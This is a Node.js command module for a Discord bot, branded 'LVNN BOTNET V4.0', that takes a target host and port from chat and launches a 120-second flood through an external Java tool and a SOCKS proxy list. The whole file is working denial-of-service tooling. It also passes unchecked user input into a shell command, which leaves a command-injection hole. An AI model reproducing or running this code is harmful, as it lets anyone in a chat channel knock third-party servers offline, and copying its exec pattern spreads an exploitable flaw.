const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`timeout 120 java -jar LVNN.jar ${host}:${port} 15000 1 LVNN socks_proxies.txt s4`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('๐ฅ **LVNN BOTNET V4.0** ๐ฅ')
	.setTimestamp()
	.setDescription("**โบ Method: LVNN ๐ฅ** \n \n โบ Attack started! โ \n โบ for 120 seconds! ๐ \n โ Flood by BlackCrack SQUAD โ")
	.setFooter('ยฉ Developer Mareczekkkk#9738.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['lvnn'],
  permLevel: 0
}

exports.help = {
  name: 'lvnn',
  description: 'รzel',
  usage: 'lvnn'
}